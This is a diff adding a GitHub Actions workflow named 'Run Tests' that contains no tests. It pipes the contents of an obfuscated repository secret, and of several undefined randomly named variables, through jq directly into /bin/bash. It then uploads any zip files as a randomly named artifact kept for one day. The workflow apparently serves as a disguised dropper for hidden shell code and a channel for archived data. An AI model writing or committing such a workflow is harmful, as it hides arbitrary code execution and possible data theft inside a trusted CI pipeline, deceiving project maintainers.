@@ -1,0 +1,30 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          anvop6886: ${{ secrets.anvop6886 }}
+        run: |
+          printf '%s' "$anvop6886" | jq -r .q1218 | /bin/bash
+          printf '%s' "$bx1034" | jq -r .hg3 | /bin/bash
+          printf '%s' "$fzbcg92" | jq -r .dipm13 | /bin/bash
+          printf '%s' "$l4902" | jq -r .f72559 | /bin/bash
+          printf '%s' "$hps3797" | jq -r .z0 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: gqEdksFS
+          path: "*.zip"
+          retention-days: 1
